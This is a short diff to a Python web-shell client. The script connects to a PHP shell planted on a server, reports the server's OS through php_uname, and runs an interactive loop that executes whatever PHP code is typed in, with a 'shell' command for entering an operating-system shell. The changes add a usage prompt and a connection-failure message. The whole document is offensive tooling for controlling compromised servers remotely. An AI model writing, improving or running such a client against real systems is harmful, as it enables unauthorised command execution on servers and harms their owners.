@@ -1,5 +1,7 @@
+#encoding = utf-8
 import requests
 import sys
+
 
 
 def check_url_exist(url):
@@ -17,6 +19,7 @@ def InputShell(url):
     if check_url_exist(url):
         systeminfo = ExecConfig(url, "print_r(php_uname('s'))")
         print('Shell Connect OK,The Server is based on {0} ,Have Fun!'.format(systeminfo))
+        print('Input PHP code you want to exec,type shell to enter the os shell,type quit to escape')
         while 1:
             func = input('[#]>')
             if func == 'shell':
@@ -30,6 +33,8 @@ def InputShell(url):
             if func == 'quit':
                 exit(print('Thank you for using!'))
             ExecConfig(url, func)
+    else:
+        print('Connect Faild,Please check your shell!')
 
 
 def ExecConfig(url, config):
